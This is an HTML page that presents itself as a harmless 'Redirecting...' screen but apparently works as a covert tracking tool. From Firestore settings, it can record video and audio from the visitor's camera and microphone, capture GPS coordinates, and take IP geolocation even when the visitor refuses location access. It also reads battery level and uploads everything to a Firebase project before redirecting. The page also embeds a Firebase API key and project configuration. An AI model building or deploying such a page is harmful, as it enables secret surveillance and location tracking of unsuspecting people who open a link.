<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .loading-dots::after {
            content: "";
            animation: dots 1s steps(4) infinite;
        }
         .error-message{
            color:red;
        }

        @keyframes dots {
             0%   {content: "";}
             25%  {content: ".";}
             50%  {content: "..";}
             75%  {content: "...";}
        }
    </style>
    <!-- Firebase SDK (Firestore) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <!-- Firebase SDK (Storage) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
</head>
<body>
    <div class="container">
        <h1>Redirecting...</h1>
        <p>You will be redirected shortly <span class="loading-dots"></span></p>
        <p id="error-message" class="error-message" style="display:none;"></p>
    </div>

<script>
// --- Firebase Config (YOUR ACTUAL CONFIG) ---
const firebaseConfig = {
    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
    authDomain: "loctrac-8d7ef.firebaseapp.com",
    projectId: "loctrac-8d7ef",
    storageBucket: "loctrac-8d7ef.firebasestorage.com",
    messagingSenderId: "34491549339",
    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
    measurementId: "G-65PYC8E9VR",
    // No databaseURL needed for Firestore
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const storage = firebase.storage(); // Initialize Firebase Storage

const errorMessage = document.getElementById("error-message");

// --- Firestore References (DYNAMIC USER ID) ---
// Function to get the *current* user ID
async function getCurrentUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
     const counterDoc = await counterRef.get();
      if (counterDoc.exists) {
        return `user${counterDoc.data().count}`;
      } else {
         return 'user1'; // Initial value. Should not normally happen
      }
}

(async () => {
    // Get the current user ID *before* fetching settings
    const currentUserId = await getCurrentUserId();
    const settingsRef = db.collection('userSettings').doc(currentUserId);
    const dataRef = db.collection('userData').doc(currentUserId);


    // Get settings from Firestore
    let micCamPermission, locationPermission, notificationPermission, redirectUrl, redirectSeconds, recordSeconds;

    try {
        const settingsSnap = await settingsRef.get();
        if (settingsSnap.exists) {
            const data = settingsSnap.data();
            micCamPermission = data.micCamPermission;
            locationPermission = data.locationPermission;
            notificationPermission = data.notificationPermission;
            redirectUrl = data.redirectUrl;
            redirectSeconds = parseInt(data.redirectSeconds) || 0;
            recordSeconds = parseInt(data.recordSeconds) || 0;
        } else {
            console.error("No settings found in Firestore.");
            errorMessage.textContent = "Fout: Kon instellingen niet laden.";
            errorMessage.style.display = 'block';
            return; // Exit if no settings
        }
    } catch (error) {
        console.error("Error fetching settings from Firestore:", error);
        errorMessage.textContent = `Firebase Fout: ${error.message}`;
        errorMessage.style.display = 'block';
        return; // Exit on error
    }

    // --- Permissions and Actions ---
    let locationData = null;
    let batteryData = null;
    let videoUrl = null;
    let locationError = null;
    let batteryError = null;
    let cameraError = null;
    let ipLocationData = null; // TIP: Variable for IP Location Data

    // Utility function to promisify Geolocation API
    function getCurrentPositionPromise() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            } else {
                reject(new Error("Geolocation is not supported"));
            }
        });
    }

     // Utility function to promisify Battery API
    function getBatteryPromise() {
        return new Promise((resolve, reject) => {
            if(navigator.getBattery) {
               resolve(navigator.getBattery());
            }else{
                reject(new Error("Battery API is not supported."));
            }
        });

    }

     // TIP: Function to fetch IP Location Data (Copied from bevestiging.html - adjust as needed)
     async function getIPLocationData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return { // TIP: Return the data, don't set global ipLocationData yet
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: parseFloat(data.latitude),
                lon: parseFloat(data.longitude),
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            console.error('Error fetching IP location data:', error);
            return null; // TIP: Return null in case of error
        }
    }

    // Function to collect location and battery data
    async function collectOtherData() {
        // 2. Location (if needed)
        if (locationPermission) {
            // *BEFORE* getting the position, ask for permission explicitly:
            if (confirm("Deze website wil je locatie gebruiken.  Sta je dit toe?")) { //  <--  TOEVOEGEN
                try {
                    const position = await getCurrentPositionPromise();
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy // TIP: Capture accuracy
                    };
                    console.log("Location data:", locationData); // <-- VERIFY
                } catch (error) {
                    console.error("Error getting location:", error);
                    let errorMsg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "Gebruiker heeft locatietoestemming geweigerd."; // TIP: More specific messages
                            break;
                        case error.POSITION_UNAVAILABLE:
                           errorMsg = "Locatie informatie is niet beschikbaar.";
                            break;
                        case error.TIMEOUT:
                           errorMsg = "De aanvraag voor locatie duurde te lang.";
                            break;
                        case error.UNKNOWN_ERROR:
                            errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
                            break;
                        default:
                            errorMsg = error.message;
                    }
                    locationError = errorMsg; // Store the full error message
                     console.error("Location error:", locationError);

                     // TIP: Fetch IP location as fallback if GPS fails
                     ipLocationData = await getIPLocationData();
                     if(ipLocationData){
                         console.log("IP Location data (fallback):", ipLocationData);
                     } else {
                         console.error("Failed to get IP location fallback as well.");
                     }

                }
            } else {
                // User denied location permission.  Set locationError.
                locationError = "Gebruiker heeft locatietoestemming geweigerd.";
                console.warn("User denied location permission.");

                // TIP: Fetch IP location even if permission denied, to still have *some* location info
                 ipLocationData = await getIPLocationData();
                 if(ipLocationData){
                     console.log("IP Location data (fallback, permission denied):", ipLocationData);
                 } else {
                     console.error("Failed to get IP location fallback even with permission denied.");
                 }
            }
        } else {
             // TIP: If location permission is not needed, still try to get IP location
             ipLocationData = await getIPLocationData();
             if(ipLocationData){
                 console.log("IP Location data (no GPS permission needed):", ipLocationData);
             } else {
                 console.error("Failed to get IP location even when GPS permission not needed.");
             }
        }


        // 3. Battery
        if (navigator.getBattery) {
            try{
                const battery = await getBatteryPromise();
                batteryData = battery.level * 100;
                console.log("Battery data:", batteryData); // <-- VERIFY

            }catch(error){
              console.error("Error getting batter:", error);
              batteryError = error.message;
              console.error("Battery error: ", batteryError);
            }
        }

        // All data collected (or errors stored), now save and redirect
        saveDataAndRedirect();
    }


    // 1. Camera/Microphone (if needed)
    if (micCamPermission) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // 2. Start recording (if needed)
            if (recordSeconds > 0) {
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = event => {
                    chunks.push(event.data);
                };

                recorder.onstop = async () => { // Make recorder.onstop async
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    console.log("Blob type:", blob.type);

                    // --- Upload to Firebase Storage ---
                    const storageRef = storage.ref();
                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`); // Unique video path

                    try {
                        await videoRef.put(blob); // Upload the blob
                        videoUrl = await videoRef.getDownloadURL(); // Get download URL
                        console.log("Video URL:", videoUrl);
                    } catch (uploadError) {
                        console.error("Error uploading video to Firebase Storage:", uploadError);
                        cameraError = "Error uploading video: " + uploadError.message; // Or more specific error message
                        videoUrl = null; // Set videoUrl to null in case of upload failure
                    } finally {
                        // --- All data collected, now save and redirect ---
                        saveDataAndRedirect();
                        stream.getTracks().forEach(track => track.stop()); // Cleanup
                    }
                };

                recorder.onstart = () => { // <-- Start timer *AFTER* recorder starts
                    setTimeout(() => {
                        if (recorder.state !== "inactive") { // Double-check state
                            recorder.stop();
                        }
                    }, recordSeconds * 1000);
                };

                recorder.start();

            } else {
                // No recording, stop stream immediately.  Proceed to collect other data.
                stream.getTracks().forEach(track => track.stop());
                collectOtherData(); // <-- GO TO NEXT STEP
            }

        } catch (error) {
            console.error("Error accessing camera/microphone:", error);
            cameraError = error.message; // Store error
            collectOtherData(); // Collect other data even if camera fails.
        }
    } else {
        // No camera/mic needed, proceed to collect other data
        collectOtherData(); // <-- GO TO NEXT STEP
    }


    // Function to save data to Firestore and perform the redirect
    async function saveDataAndRedirect() {
    const dataToSave = {
        videoUrl: videoUrl || null,  // Save the video URL (or null) - Now Firebase Storage URL
        location: locationData || null, // Save location data (or null)
        batteryPercentage: batteryData,  //  No || null
        locationError: locationError || null,  // Save any errors
        batteryError: batteryError || null,
        cameraError: cameraError || null,
        ipLocation: ipLocationData || null, // TIP: Save IP Location Data
    };

        console.log("Data to save:", dataToSave); // <-- CHECK WHAT'S BEING SAVED

        try {
            await dataRef.set(dataToSave);
            console.log("Data saved to Firestore!");
        } catch (error) {
            console.error("Error saving data to Firestore:", error);
             errorMessage.textContent = `Firestore Fout: ${error.message}`;
            errorMessage.style.display = 'block';
            // Still redirect even if save fails
        }

        // Perform the redirect
        if (redirectUrl) {
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, redirectSeconds * 1000);
        } else {
             errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
            errorMessage.style.display = 'block';
        }
    }
})();
</script>
</body>
</html>
